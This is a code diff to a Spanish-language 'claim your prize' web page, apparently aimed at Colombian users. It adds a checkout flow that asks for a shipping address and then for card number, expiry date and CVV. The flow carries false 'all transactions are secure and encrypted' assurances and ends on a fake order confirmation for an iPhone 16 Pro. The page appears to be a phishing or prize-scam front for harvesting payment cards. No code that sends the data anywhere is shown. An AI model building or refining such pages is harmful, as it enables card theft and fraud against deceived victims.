@@ -56,14 +56,6 @@
                 </div>
             </div>
 
-            <div style="display: none;" class="code-section">
-                <div class="code-label">CODE:</div>
-                <div class="code-value">
-                    <span id="promoCode">QZXY2G8</span>
-                    <button class="copy-button" id="copyButton">📋</button>
-                </div>
-            </div>
-
             <div class="instructions">
                 <p>Completa tus datos personales y de envío para recibir el premio y confirmar la entrega correctamente
                     dentro del proceso indicado. Continúa y valida la información solicitada ahora!!!
@@ -71,6 +63,169 @@
             </div>
 
             <button class="claim-button" id="claimButton">RECLAMAR AHORA</button>
+        </div>
+    </div>
+
+    <!-- Checkout Process -->
+    <div id="checkoutContainer" class="checkout-container" style="display: none;">
+        <div class="checkout-modal">
+            <header class="checkout-header">
+                <button id="closeCheckout" class="close-btn">&times;</button>
+                <div class="checkout-steps">
+                    <div class="step active" id="step1-indicator">1</div>
+                    <div class="step-divider"></div>
+                    <div class="step" id="step2-indicator">2</div>
+                    <div class="step-divider"></div>
+                    <div class="step" id="step3-indicator">3</div>
+                </div>
+            </header>
+
+            <!-- Step 1: User Info -->
+            <div id="step1" class="checkout-step active">
+                <h3>Agregar una nueva dirección</h3>
+                <p class="security-note"><span class="lock-icon">🔒</span> Todos los datos están protegidos</p>
+
+                <form id="addressForm">
+                    <div class="form-group">
+                        <label>Departamento *</label>
+                        <select required>
+                            <option value="">Seleccionar</option>
+                            <option value="antioquia">Antioquia</option>
+                            <option value="bogota">Bogotá D.C.</option>
+                            <option value="valle">Valle del Cauca</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Municipio *</label>
+                        <select required>
+                            <option value="">Seleccionar</option>
+                            <option value="medellin">Medellín</option>
+                            <option value="bogota">Bogotá</option>
+                            <option value="cali">Cali</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Dirección *</label>
+                        <input type="text" placeholder="Calle/Torre/Casa o número de apartamento/Oficina, etc."
+                            required>
+                        <p class="input-hint">P.ej. Calle 56 #28-04</p>
+                    </div>
+                    <div class="form-group">
+                        <label>Información adicional (opcional)</label>
+                        <input type="text" placeholder="Piso/Edificio/Fachada/Otro">
+                    </div>
+                    <div class="form-checkbox">
+                        <input type="checkbox" id="defaultAddr">
+                        <label for="defaultAddr">Establecer como mi dirección predeterminada</label>
+                    </div>
+                    <button type="submit" class="checkout-btn">Guardar</button>
+                </form>
+            </div>
+
+            <!-- Step 2: Payment -->
+            <div id="step2" class="checkout-step">
+                <h3>Métodos de pago</h3>
+                <div class="payment-method-header">
+                    <span class="radio-icon filled"></span>
+                    <span class="card-icon">💳</span>
+                    <div class="payment-text">
+                        <p>Tarjeta</p>
+                        <p class="subtitle">Paga ahora o paga mensualmente</p>
+                    </div>
+                    <div class="card-brands">
+                        <img src="https://img.icons8.com/color/48/000000/visa.png" width="30">
+                        <img src="https://img.icons8.com/color/48/000000/mastercard.png" width="30">
+                    </div>
+                </div>
+
+                <div class="payment-card-form">
+                    <p class="security-note"><span class="lock-icon">🔒</span> Todas las transacciones son seguras y
+                        cifradas</p>
+
+                    <form id="paymentForm">
+                        <div class="form-group">
+                            <label>Número de tarjeta *</label>
+                            <div class="input-with-icon">
+                                <input type="text" placeholder="Número de tarjeta" required maxlength="19">
+                                <span class="shield-icon">🛡️</span>
+                            </div>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Fecha de vencimiento *</label>
+                                <div class="date-inputs">
+                                    <select required>
+                                        <option value="">Mes</option>
+                                        <option value="01">01</option>
+                                        <option value="02">02</option>
+                                        <option value="03">03</option>
+                                        <option value="04">04</option>
+                                        <option value="05">05</option>
+                                        <option value="06">06</option>
+                                        <option value="07">07</option>
+                                        <option value="08">08</option>
+                                        <option value="09">09</option>
+                                        <option value="10">10</option>
+                                        <option value="11">11</option>
+                                        <option value="12">12</option>
+                                    </select>
+                                    <select required>
+                                        <option value="">Año</option>
+                                        <option value="2024">2024</option>
+                                        <option value="2025">2025</option>
+                                        <option value="2026">2026</option>
+                                        <option value="2027">2027</option>
+                                        <option value="2028">2028</option>
+                                        <option value="2029">2029</option>
+                                        <option value="2030">2030</option>
+                                        <option value="2031">2031</option>
+                                        <option value="2032">2032</option>
+                                        <option value="2033">2033</option>
+                                        <option value="2034">2034</option>
+                                        <option value="2035">2035</option>
+                                    </select>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label>CVV * ?</label>
+                                <div class="input-with-icon">
+                                    <input type="text" placeholder="Código de 3 a 4 dígitos" required maxlength="4">
+                                    <span class="lock-small">🔒</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="form-checkbox">
+                            <input type="checkbox" id="saveCard" checked>
+                            <label for="saveCard">Recuerde esta tarjeta para uso futuro.</label>
+                        </div>
+                        <button type="submit" class="checkout-btn">Pagar ahora</button>
+                    </form>
+                </div>
+            </div>
+
+            <!-- Step 3: Success -->
+            <div id="step3" class="checkout-step success-step">
+                <div class="success-header">
+                    <div class="big-success-icon">✅</div>
+                    <h2>¡Pedido Confirmado!</h2>
+                    <p>Felicidades, tu iPhone 16 Pro está en camino.</p>
+                </div>
+                <div class="shipping-status">
+                    <div class="status-box">
+                        <p class="status-title">Estado del pedido</p>
+                        <p class="status-desc">El producto se encuentra en proceso para ser empacado y enviado
+                            correctamente.</p>
+                    </div>
+                    <div class="tracking-visual">
+                        <div class="track-step active">📦<br>Procesando</div>
+                        <div class="track-line"></div>
+                        <div class="track-step">🚚<br>Enviado</div>
+                        <div class="track-line"></div>
+                        <div class="track-step">🏠<br>Entregado</div>
+                    </div>
+                </div>
+                <button id="finishCheckout" class="checkout-btn">Volver a la tienda</button>
+            </div>
         </div>
     </div>
 
